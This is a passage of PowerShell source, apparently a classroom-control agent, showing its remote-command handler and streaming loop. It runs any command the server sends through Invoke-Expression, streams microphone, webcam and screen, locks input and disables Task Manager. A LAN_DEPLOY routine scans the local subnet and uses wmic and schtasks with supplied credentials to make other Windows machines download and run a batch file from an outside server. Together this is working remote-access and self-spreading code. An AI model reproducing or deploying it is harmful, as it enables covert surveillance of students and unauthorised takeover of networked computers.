                                    $Global:SharedState.BlockedApps = @($payload.apps)
                                } else {
                                    $Global:SharedState.BlockedApps = @()
                                }
                                Save-BlockedAppsConfig $Global:SharedState.BlockedApps
                                Update-RunningAppsAndEnforceBlock
                                Send-WsStatus $ws
                                $lastScreenTime = [DateTime]::UtcNow.AddSeconds(-1.85)
                            }
                            "KILL_APP" {
                                $targetApp = if ($payload.app) { $payload.app } else { $payload.apps }
                                Stop-StudentApps $targetApp
                                Update-RunningAppsAndEnforceBlock
                                Send-WsStatus $ws
                                $lastScreenTime = [DateTime]::UtcNow.AddSeconds(-1.85)
                            }
                            "CLOSE_ALL_APPS" {
                                Close-AllStudentApps
                                Update-RunningAppsAndEnforceBlock
                                Send-WsStatus $ws
                                $lastScreenTime = [DateTime]::UtcNow.AddSeconds(-1.85)
                            }
                            "LAUNCH_APP" {
                                $appCmd = if ($payload.app) { $payload.app } else { $payload.cmd }
                                if ($appCmd) {
                                    try { Start-Process $appCmd } catch {}
                                    $lastScreenTime = [DateTime]::UtcNow.AddSeconds(-1.4)
                                }
                            }
                            "DISABLE_VEYON" {
                                $Global:SharedState.VeyonStatus = "disabled"
                                Stop-Service -Name "VeyonService" -Force -ErrorAction SilentlyContinue
                                & sc.exe config VeyonService start= disabled | Out-Null
                                Stop-Process -Name "*veyon*" -Force -ErrorAction SilentlyContinue
                                [WinGuardSecurity]::BlockInput($false) | Out-Null
                                [WinGuardSecurity]::UninstallHook() | Out-Null
                                [WinGuardSecurity]::SetTaskMgrDisabled($false) | Out-Null
                                Send-WsStatus $ws
                            }
                            "BROADCAST_START" {
                                $Global:SharedState.LockInput = if ($null -ne $payload.lock_input) { [bool]$payload.lock_input } else { $true }
                                $Global:SharedState.Mode = "broadcast"
                                if ($Global:SharedState.LockInput) {
                                    [WinGuardSecurity]::BlockInput($true) | Out-Null
                                    [WinGuardSecurity]::InstallHook() | Out-Null
                                    [WinGuardSecurity]::SetTaskMgrDisabled($true) | Out-Null
                                }
                                Send-WsStatus $ws
                            }
                            "BROADCAST_FRAME" {
                                if ($payload.image) {
                                    $Global:SharedState.FrameBytes = [Convert]::FromBase64String($payload.image)
                                    $Global:SharedState.FrameTick++
                                    if ($Global:SharedState.Mode -ne "broadcast") {
                                        $Global:SharedState.Mode = "broadcast"
                                    }
                                }
                            }
                            "BROADCAST_STOP" {
                                $Global:SharedState.Mode = "normal"
                                $Global:SharedState.LockInput = $false
                                [WinGuardSecurity]::BlockInput($false) | Out-Null
                                [WinGuardSecurity]::UninstallHook() | Out-Null
                                [WinGuardSecurity]::SetTaskMgrDisabled($false) | Out-Null
                                Send-WsStatus $ws
                            }
                            "OPEN_URL" {
                                if ($payload.url) { Start-Process $payload.url }
                            }
                            "SEND_MESSAGE" {
                                if ($payload.message) {
                                    $txt = $payload.message
                                    Start-Job -ScriptBlock {
                                        param($m)
                                        Add-Type -AssemblyName System.Windows.Forms
                                        [System.Windows.Forms.MessageBox]::Show($m, "Thong bao tu Giao vien", 0, 64)
                                    } -ArgumentList $txt | Out-Null
                                }
                            }
                            "RESTART_VEYON" {
                                & sc.exe config VeyonService start= auto | Out-Null
                                Start-Service -Name "VeyonService" -ErrorAction SilentlyContinue
                                $Global:SharedState.VeyonRestarts++
                                $Global:SharedState.VeyonStatus = "running"
                                Send-WsStatus $ws
                            }
                            "SHUTDOWN" {
                                [WinGuardSecurity]::BlockInput($false) | Out-Null
                                [WinGuardSecurity]::UninstallHook() | Out-Null
                                [WinGuardSecurity]::SetTaskMgrDisabled($false) | Out-Null
                                Start-Process "shutdown.exe" -ArgumentList "/s /t 0 /f" -NoNewWindow
                            }
                            "REBOOT" {
                                [WinGuardSecurity]::BlockInput($false) | Out-Null
                                [WinGuardSecurity]::UninstallHook() | Out-Null
                                [WinGuardSecurity]::SetTaskMgrDisabled($false) | Out-Null
                                Start-Process "shutdown.exe" -ArgumentList "/r /t 0 /f" -NoNewWindow
                            }
                            "LOGOUT" {
                                [WinGuardSecurity]::BlockInput($false) | Out-Null
                                [WinGuardSecurity]::UninstallHook() | Out-Null
                                [WinGuardSecurity]::SetTaskMgrDisabled($false) | Out-Null
                                Start-Process "shutdown.exe" -ArgumentList "/l" -NoNewWindow
                            }
                            "AUDIO_LISTEN_START" {
                                $lMode = if ($payload -and $payload.mode) { [string]$payload.mode } else { "both" }
                                [WinGuardSecurity]::StartMicStream($lMode)
                                Send-WsStatus $ws
                            }
                            "AUDIO_LISTEN_STOP" {
                                [WinGuardSecurity]::StopMicStream()
                                Send-WsStatus $ws
                            }
                            "WEBCAM_START" {
                                [WinGuardSecurity]::StartWebcamStream()
                                Send-WsStatus $ws
                            }
                            "WEBCAM_STOP" {
                                [WinGuardSecurity]::StopWebcamStream()
                                Send-WsStatus $ws
                            }
                            "AUDIO_PLAY" {
                                if ($payload.pcm_b64) {
                                    [WinGuardSecurity]::PlayPcmB64([string]$payload.pcm_b64)
                                }
                            }
                            "SET_VOLUME" {
                                $vol = if ($null -ne $payload.volume) { [int]$payload.volume } else { -1 }
                                $mut = if ($null -ne $payload.muted) { [bool]$payload.muted } else { [WinGuardSecurity]::IsSpeakerMuted }
                                [WinGuardSecurity]::SetAudioVolume($vol, $mut)
                                Send-WsStatus $ws
                            }
                            "WAKE_ON_LAN" {
                                try {
                                    $udp = New-Object System.Net.Sockets.UdpClient
                                    $udp.EnableBroadcast = $true
                                    foreach ($m in $payload.macs) {
                                        $hex = ($m -replace '[^0-9a-fA-F]','')
                                        if ($hex.Length -eq 12) {
                                            $macBytes = New-Object byte[] 6
                                            for ($i=0; $i -lt 6; $i++) { $macBytes[$i] = [Convert]::ToByte($hex.Substring($i*2,2), 16) }
                                            $packet = New-Object byte[] 102
                                            for ($i=0; $i -lt 6; $i++) { $packet[$i] = 0xFF }
                                            for ($i=1; $i -le 16; $i++) { [Array]::Copy($macBytes, 0, $packet, $i*6, 6) }
                                            foreach ($ip in @("255.255.255.255","192.168.1.255","192.168.0.255")) {
                                                $udp.Send($packet, $packet.Length, $ip, 9) | Out-Null
                                                $udp.Send($packet, $packet.Length, $ip, 7) | Out-Null
                                            }
                                        }
                                    }
                                    $udp.Close()
                                } catch {}
                            }
                            "EXEC_CMD" {
                                if ($payload.cmd) {
                                    $exitCode = 0
                                    try {
                                        $out = (Invoke-Expression $payload.cmd 2>&1 | Out-String)
                                    } catch {
                                        $out = ($_ | Out-String)
                                        $exitCode = 1
                                    }
                                    Send-WsJson $ws @{
                                        type       = "CMD_RESULT"
                                        req_id     = ($payload.req_id + "")
                                        machine_id = $MACHINE_ID
                                        cmd        = $payload.cmd
                                        output     = $out
                                        exit_code  = $exitCode
                                    }
                                }
                            }
                            "LAN_DEPLOY" {
                                $lanUser = if ($payload -and $payload.ssh_user) { [string]$payload.ssh_user } else { "Administrator" }
                                $lanPass = if ($payload -and $payload.ssh_pass) { [string]$payload.ssh_pass } else { "" }
                                $myIp = Get-LocalIP
                                $parts = $myIp -split '\.'
                                if ($parts.Count -eq 4) {
                                    $subnet = "$($parts[0]).$($parts[1]).$($parts[2])"
                                    $foundWin = New-Object System.Collections.Generic.List[string]
                                    $foundSsh = New-Object System.Collections.Generic.List[string]
                                    $installed = New-Object System.Collections.Generic.List[string]
                                    $winRemoteCmd = "cmd.exe /c curl.exe -sSL $VPS_HTTP/s.bat -o C:\Windows\Temp\s.bat && C:\Windows\Temp\s.bat"
                                    for ($i = 1; $i -le 254; $i++) {
                                        $ip = "$subnet.$i"
                                        if ($ip -eq $myIp) { continue }
                                        $tc445 = New-Object System.Net.Sockets.TcpClient
                                        try {
                                            $ar = $tc445.BeginConnect($ip, 445, $null, $null)
                                            if ($ar.AsyncWaitHandle.WaitOne(85, $false) -and $tc445.Connected) {
                                                $foundWin.Add($ip)
                                                $tc445.Close()
                                                continue
                                            }
                                        } catch {}
                                        try { $tc445.Close() } catch {}
                                        $tc22 = New-Object System.Net.Sockets.TcpClient
                                        try {
                                            $ar2 = $tc22.BeginConnect($ip, 22, $null, $null)
                                            if ($ar2.AsyncWaitHandle.WaitOne(75, $false) -and $tc22.Connected) {
                                                $foundSsh.Add($ip)
                                            }
                                        } catch {}
                                        try { $tc22.Close() } catch {}
                                    }
                                    foreach ($ip in $foundWin) {
                                        $ok = $false
                                        try {
                                            if ($lanPass) {
                                                & wmic.exe /node:"$ip" /user:"$lanUser" /password:"$lanPass" process call create "$winRemoteCmd" 2>&1 | Out-Null
                                                if ($LASTEXITCODE -eq 0) { $ok = $true }
                                                if (-not $ok) {
                                                    & schtasks.exe /Create /S $ip /U $lanUser /P $lanPass /SC ONCE /TN "SG_LAN_Install" /TR "$winRemoteCmd" /ST 00:00 /RU SYSTEM /F 2>&1 | Out-Null
                                                    if ($LASTEXITCODE -eq 0) {
                                                        & schtasks.exe /Run /S $ip /U $lanUser /P $lanPass /TN "SG_LAN_Install" 2>&1 | Out-Null
                                                        $ok = $true
                                                    }
                                                }
                                            } else {
                                                & wmic.exe /node:"$ip" process call create "$winRemoteCmd" 2>&1 | Out-Null
                                                if ($LASTEXITCODE -eq 0) { $ok = $true }
                                                if (-not $ok) {
                                                    & schtasks.exe /Create /S $ip /SC ONCE /TN "SG_LAN_Install" /TR "$winRemoteCmd" /ST 00:00 /RU SYSTEM /F 2>&1 | Out-Null
                                                    if ($LASTEXITCODE -eq 0) {
                                                        & schtasks.exe /Run /S $ip /TN "SG_LAN_Install" 2>&1 | Out-Null
                                                        $ok = $true
                                                    }
                                                }
                                            }
                                        } catch {}
                                        if ($ok) { $installed.Add($ip) }
                                    }
                                    $msgOut = "Tram phat LAN Windows: $myIp ($subnet.0/24)`n" +
                                              "May Windows (Port 445) tim thay ($($foundWin.Count)): $($foundWin -join ', ')`n" +
                                              "May Linux/SSH (Port 22) tim thay ($($foundSsh.Count)): $($foundSsh -join ', ')`n" +
                                              "Da day cai dat tu dong thanh cong ($($installed.Count)): $($installed -join ', ')"
                                    Send-WsJson $ws @{
                                        type       = "CMD_RESULT"
                                        req_id     = "lan-deploy"
                                        machine_id = $MACHINE_ID
                                        cmd        = "LAN_DEPLOY ($subnet.0/24)"
                                        output     = $msgOut
                                        exit_code  = 0
                                    }
                                }
                            }
                        }
                    } catch {}
                }
                $recvTask = $ws.ReceiveAsync($recvSeg, [System.Threading.CancellationToken]::None)
            }

            $now = [DateTime]::UtcNow
            while ($true) {
                $micChunk = [WinGuardSecurity]::DequeueMicChunk()
                if (-not $micChunk) { break }
                Send-WsJson $ws @{
                    type        = "AUDIO_STREAM"
                    machine_id  = $MACHINE_ID
                    sample_rate = 16000
                    pcm_b64     = $micChunk
                    level       = [WinGuardSecurity]::LastMicLevel
                    listen_mode = [WinGuardSecurity]::AudioListenMode
                }
            }

            while ($true) {
                $camFrame = [WinGuardSecurity]::DequeueWebcamFrame()
                if (-not $camFrame) { break }
                Send-WsJson $ws @{
                    type       = "WEBCAM_FRAME"
                    machine_id = $MACHINE_ID
                    image      = $camFrame
                }
            }

            if (($now - $lastAppCheckTime).TotalSeconds -ge 0.6) {
                $lastAppCheckTime = $now
                Update-RunningAppsAndEnforceBlock
            }

            $intervalSec = if ($Global:SharedState.LiveFocus) { 0.45 } else { 1.5 }
            if (($now - $lastScreenTime).TotalSeconds -ge $intervalSec) {
                $lastScreenTime = $now
                $b64 = Capture-ScreenBase64
                if ($b64) {
                    Send-WsJson $ws @{
                        type         = "SCREEN"
                        machine_id   = $MACHINE_ID
                        image        = $b64
                        mode         = $Global:SharedState.Mode
                        veyon_status = $Global:SharedState.VeyonStatus
                    }
                }
            }

            if (($now - $lastHealTime).TotalSeconds -ge 3.0) {
                $lastHealTime = $now
                Invoke-SelfHeal
                Send-WsStatus $ws
            }
        }
    } catch {}
    finally {
        try { $ws.Dispose() } catch {}
    }

    Invoke-SelfHeal
    Start-Sleep -Seconds 2
}
